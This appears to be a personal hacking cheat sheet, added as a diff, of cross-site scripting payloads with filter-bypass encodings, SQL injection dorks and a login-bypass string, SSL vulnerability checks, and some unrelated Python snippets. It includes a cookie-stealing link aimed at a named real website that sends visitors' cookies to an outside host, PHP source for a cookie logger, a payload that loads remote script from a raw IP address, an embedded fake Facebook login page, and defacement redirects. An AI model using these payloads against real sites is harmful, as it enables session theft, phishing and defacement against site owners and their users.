+POODLE TESTING
+$ openssl s_client -connect google.com:443 -ssl3
+if it shows handshake accepted then its vuln
+If there is a handshake failure then the server is not supporting SSLv3 and it is secure from this vulnerability. Otherwise it is required to disable SSLv3 support.
+----------------------------------------------------
+FREAK 
+https://tools.keycdn.com/freak
+-----------------------------------------------------
+
+
+<a/href=javascript&colon;co\u006efir\u006d&#40;&quot;XSS_by_Shawar&quot;&#41;>XSS by Shawar Khan
+
+insert in link: http://xssplayground.net23.net/xss%22onmouseover=%22alert(1);%20imagefile.svg?"onmouseover="alert(1)
+
+<img/id="confirm&1par;1&#x2promp&#116;&lpar1&rpar; 9;"/alt="/"src="x"onmouseover=eval(id&#x29;>
+
+alert('test'test/"test")
+alert(/"//"+1")
+
+
+XSS in data/time: '<\i\m\g \s\r\c=x \o\n\e\r\r\o\r=\a\l\e\r\t(\'X\S\S\')\>'
+
+'"()&%<ScRiPt >prompt(document.domain)</ScRiPt>javscript
+
+http://public-firing-range.appspot.com/reflected/parameter/body?q=%3Cscript%20src=%22http://39.34.161.142:2001/xook.js%22%3E%3C/script%3E open this link bro keep it opened
+
+
+WYSIWYG style attribute:   width:expression(alert(1))
+<a href="javascript:confirm%28 1%29">test</a>
+<a href="data:text/html,<script>alert(1)</script>">D4rk
+<a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">click</a>
+
+-------------------------------------------------------------------------------------------------
+data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4gCjwhRE9DVFlQRSBodG1sIFsgCjwhRU5USVRZIHhzcyAiJiM2MDtzY3JpcHQmIzYyO2NvbmZpcm0obG9jYXRpb24pJiM2MDsvc2NyaXB0JiM2MjsiPiAKXT4gCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4gCjxoZWFkPiAKPHRpdGxlPlhNTCBYU1MgVmVjdG9yPC90aXRsZT4gCjwvaGVhZD4gCjxib2R5PiAKJnhzczsgCjwvYm9keT4gCjwvaHRtbD4=
+
+Useful in cases if sites automatically insert anchor tag (<a>) around image ...
+
+---------------------------------------------------------------------------------------------
+
+http://xssplayground.net23.net/xss%22onmouseover=%22alert(1);%20imagefile.svg?"onmouseover="alert(1)
+
+<a/onclick="i=createElement('iframe');i.src='javascript:alert(1)';x=parentNode;x.appendChild(i);"/href=#>Click</a>
+
+var j=escape(i);document.write(j) document.write(unescape(i))</script>
+
+<img/src=x onerror=prompt(2)> 
+<textarea autofocus onfocus=prompt(1)>
+
+XSS in CSS: body{width:expression(alert(1)}
+
+javascript:goPage('/support/retrieve/byemail/')
+
+<script%2fsrc='http://xssplaygroundforfunandlearn.netai.net/scr2.js'> < </script>
+
+<details ontoggle=confirm(1)> 
+"><h2 id="Iamheading"onmouseover="confirm(1)">d4rk
+
+jpg xss: <img src='/static/demos/GEECS'><img src=x onerror=alert(/DOM-XSS/)>.jpg' />
+
+XSS locator:  '';!--"<d4rkf34r>=&{()}
+
+HEX ENCODED javascript:alert(1):
+
+&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;
+
+FLASH XSS(swfupload2.swf) : "]);}catch(e){}if(!self.a)self.a=!alert('XSS-by-shawar-khan');//
+
+ENCODED SVG TAG:-
+
+Hex value for URL:  %22%2F%3E%3C%73%76%67%2F%6F%6E%6C%6F%61%64%3D%70%72%6F%6D%70%74%28%31%29%3E
+
+Code for HTMLhex: &#x22;&#x2F;&#x3E;&#x3C;&#x73;&#x76;&#x67;&#x2F;&#x6F;&#x6E;&#x6C;&#x6F;&#x61;&#x64;&#x3D;&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;&#x28;&#x31;&#x29;&#x3E;
+
+Code for HTMLdecimal:  &#34&#47&#62&#60&#115&#118&#103&#47&#111&#110&#108&#111&#97&#100&#61&#112&#114&#111&#109&#112&#116&#40&#49&#41&#62
+
+Base64:  Ii8+PHN2Zy9vbmxvYWQ9cHJvbXB0KDEpPg==
+
+
+======================
+XSS SCRIPTS BY SHAWAR
+======================
+Iframe XSS detection:	<iFrAmE/src=jAvAscrIpT:>
+1<div style=width:expression(prompt(967494))>
+
+base64 script: 	data :text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTUE9TRUQvKTwvc2NyaXB0Pg==#
+
+base64 svg: 	data :text/html;base64,PHN2Zy9vbmxvYWQ9cHJvbXB0KGRvY3VtZW50LmRvbWFpbik+#
+
+
+
+BYPASSING:
+attribute: " onmouseover=prompt(document.domain) xsstestbyshawar="
+Auto detect xss: 	1"/><svg/onload=prompt(1)>
+broken xss detect: 1"/><img src=x onerror=prompt(1)>
+
+img HEX:	%22%2f%3e%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%65%72%72%6f%72%3d%70%72%6f%6d%70%74%28%31%29%3e
+
+
+attribute inject: " onmouseover=alert(1) bad="
+
+dommain + name img bypasstrick:    "/><img src=x onerror=alert(document.domain+"\nXSS.by.Shawar.Khan")>
+
+auto detect + attribute: " onmouseover=prompt(1) bad="'/><svg/onload=prompt(1);>
+
+s"/><img src=x onerror=prompt(1);>s
+
+Auto detect xss: 	"/><svg/onload=prompt(1)>
+broken xss detect: "/><img src=x onerror=prompt(1);>
+
+hex encoding(with semicolon): 	<IMG SRC=x onerror=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+
+hex encoding(without semicolor): <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+
+Script detection bypass: <<SCRIPT>alert("XSS");//<</SCRIPT>
+
+input in JS bypass: 	\";alert('XSS');//
+
+xss in style tag CSS(works in IE):	body{xss:expression(alert(1))}
+
+Maximum Filteration:
+------------------------------------------------------------------------------
+<a fooooooooooooooooooooooo href=jAvAsCrIpT&colon;prompt&lpar;1&rpar;>ClickMe
+
+<h1/ondrag=co\u006efir\u006d(/xss-by-shawar/)>Alert</h1>
+
+<a id="a"href=javascript&colon;alert&lpar;1&rpar; id="a">Click me plz</a>#a <
+
+<a+id="a"href=javascript%26colon;alert%26lpar;1%26rpar;+id="a" style=width:100%25;height:100%25;position:fixed;left:0;top:0 x>Click me plz</a>
+
+<h1/ondrag=co\u006efir\u006d(document.cookie)>1
+-------------------------------------------------------------------------------
+
+
+Script and Alert word restriction bypass:
+-------------------------------------------------------------
+<ScRipt>ALeRt("hi");</sCRipT>
+-------------------------------------------------------------
+
+
+Magic quote bypass:
+------------------------------------------------------------------------------------------
+<script>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 104, 105, 34, 41, 59)</script>
+------------------------------------------------------------------------------------------
+
+Hex Encoding:
+--------------------------------------------------------------
+http://centricle.com/tools/ascii-hex/ 
+--------------------------------------------------------------
+
+Hex encoded XSS alert:
+---------------------------------------------------------------------------------------
+%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%48%69%22%29%3b%3c%2f%73%63%72%69%70%74%3e
+---------------------------------------------------------------------------------------
+
+===============================================
+Cross-Site Scripting Scripts by Shawar Khan
+===============================================
+1'or'1'='1
+#"><img src=x prompt(1);>
+
+Script cover filter:	1"/>d<img src=x onerror=prompt(1);>d4rk
+
+Comment bypass: "--></style></script><script>alert(1)</script>
+
+Broken Image:	1"/><img src=x onerror=prompt(1);>
+
+Onerror attribute:	.' onerror='alert("XSS")
+
+Mouseover double quote attribute bypass:  " onmouseover=prompt(946817) bad="
+
+SVG onload alert:	<svg onload=alert("XSS")>
+
+Body Onload alert:	"><BODY ONLOAD=alert('XSS-By-Shawar-Khan')>
+
+Encoded:	<script>prompt(String.fromCharCode(88, 83, 83, 32, 86, 117, 108, 110, 101, 114, 97, 98, 105, 108, 105, 116, 121, 32, 70, 111, 117, 110, 100, 32, 66, 121, 32, 83, 104, 97, 119, 97, 114))</script>
+
+Bypass:		'"()&%1<ScRiPt >prompt(1)</ScRiPt>
+
+Simple img xss:		xsstestbyshawar\"><img src=x onerror=prompt(/xss-by-shawar/);>
+
+Img xss:		#"><img src=x onerror=prompt(/xss-by-shawar/);>
+
+
+
+
+
+==========================
+DIV inside a webpage(XSS):
+==========================
+
+<div><object+type="text/html"+data="http://www.fb-likeee.0zed.com/login.php"+width="300px"+height="330px"+style="overflow:auto;border:2px+ridge+white"></object></div>
+
+
+
+
+=========================
+Facebook ACCOUNT LOCK
+=========================
+
+http://()34255353309 remove ()
+
+-----------------------------
+
+
+
+==========================
+POWERFULL SQLI DORKS
+==========================
+
+newsDetail.php?id=
+product-item.php?id=
+news_view.php?id=
+pages.php?id=
+-------------------------
+
+
+
+====================
+Admin Panel Bypass:
+====================
+
+1'or'1'='1
+--------------------
+
+
+
+
+=====================================
+INJECTED XSS SCRIPTS AND IMAGES
+=====================================
+
+Cookie Stealer: http://www.slaughamarchives.org/admin.asp?errmsg=%3Cscript%3Elocation.href%20%3D%20%27http%3A%2f%2fwww.darkfear.site88.net%2fCookie%2fStealer.php%3Fcookie%3D%27%2bdocument.cookie%3B%3C%2fscript%3E
+
+Javascript(D4rk F34r Image)  <img src="https://scontent-b-cdg.xx.fbcdn.net/hphotos-xpf1/t1.0-9/10553383_1531028083784083_2657419866700386351_n.jpg" style="length:400px;width:400px;">
+
+
+
+
+================================
+Cookie Stealer
+================================
+
+<?php
+$cookie = $_GET[‘cookie’];
+$log = fopen(“cookielog.txt”, “a”);
+fwrite($log, $cookie .”n”);
+fclose($log);
+?>
+
+<?php
+$cookie = $HTTP_GET_VARS[“cookie”];
+$file = fopen(‘cookielog.txt’, ‘a’);
+fwrite($file, $cookie . “nn”);
+?>
+------------------------------------
+
+
+apple questions:
+
+proxy:
+104.155.220.58
+
+
+========================================
+USEFUL THINGS
+========================================
+
+Blind SQLI: {"user_id": "5755 and sleep(12)=1", "receiver": "value"}
+
+Ip finder: mail.bvog.com(get ip via link)
+
+Redirection XSS script: <meta http-equiv="refresh" content="0;url=http://d4rk-f34r.blogspot.com">
+
+<script>alert("Hacked By D4rk F34r")</script><meta http-equiv="refresh" content="0;url=http://www.diamondgym.in/index.html">
+
+Popup XSS: <script>alert("XSS")</script>
+
+Stylish Font: Myriad Set ProQ
+
+
+https://google.com.pk&_afrLoop=1110059547150000&_afrWindowMode=0&_afrWindowId=null#!@@?_afrWindowId=null&_afrLoop=1110059547150000&ct=us&lg=en&returnURL=https://google.com.pk&_afrWindowMode=0&_adf.ctrl-state=dt2azqybk_86
+
+REDIRECT TEST
+SIMPLE XSS SCRIPTS:
+---------------------------------------------------------------------------------------------------
+XSS: "><BODY ONLOAD=alert('XSS-by-d4rk-f34r')>
+"><img src=x on error=prompt(document.domain)>
+<a style="visibility:visible;" onmouseover=alert("XSS-Test-By-D4rk-F34r")>XSS Test By D4rk F34r</a>
+"><script>alert("XSS By D4rk F34r")</script>
+"><meta http-equiv="refresh" content="0;url=url">
+<meta http-equiv="refresh" content="0;url=192.168.5.193">
+----------------------------------------------------------------------------------------------------
+
+ASCII Box drawing:
+
+─	━	│	┃	┄	┅	┆	┇	┈	┉	┊	┋	┌	┍	┎	┏
+
+┐	┑	┒	┓	└	┕	┖	┗	┘	┙	┚	┛	├	┝	┞	┟
+
+┠	┡	┢	┣	┤	┥	┦	┧	┨	┩	┪	┫	┬	┭	┮	┯
+
+┰	┱	┲	┳	┴	┵	┶	┷	┸	┹	┺	┻	┼	┽	┾	┿
+
+╀	╁	╂	╃	╄	╅	╆	╇	╈	╉	╊	╋	╌	╍	╎	╏
+
+═	║	╒	╓	╔	╕	╖	╗	╘	╙	╚	╛	╜	╝	╞	╟
+
+╠	╡	╢	╣	╤	╥	╦	╧	╨	╩	╪	╫	╬	╭	╮	╯
+
+╰	╱	╲	╳	╴	╵	╶	╷	╸	╹	╺	╻	╼	╽	╾	╿
+
+┌──┐
+│  │
+└──┘
+┍━━┑
+│  │
+┕━━┙
+
+Python Equal Length Maker:
+MAX_STRING_SIZE = len(max([str(i) for i in LIST_HERE_TO_CHECK],key=len))
+
+' '*int(MAX_STRING_SIZE-len(str(CURRENT_STRING)))
+
+singe line if else with for loop
+[('unknown' if i == '' else i) for i in services]
+
+python autotype:
+for i in 'woot:)': sys.stdout.write(i);sys.stdout.flush();time.sleep(0.07)
+
+
+data retrieve with fetch() api:
+
+fetch('').then((resp) => resp.text()).then(function(data){
+    alert(data)
+}
+)
+
+
+fetch with credentials: true:
+fetch('https://help.useresponse.com/sdk/resource.js',{credentials: 'include'}).then((resp) => resp.text()).then(function(data){
+    alert(data)
+}
+)
+
+
+<a+href="
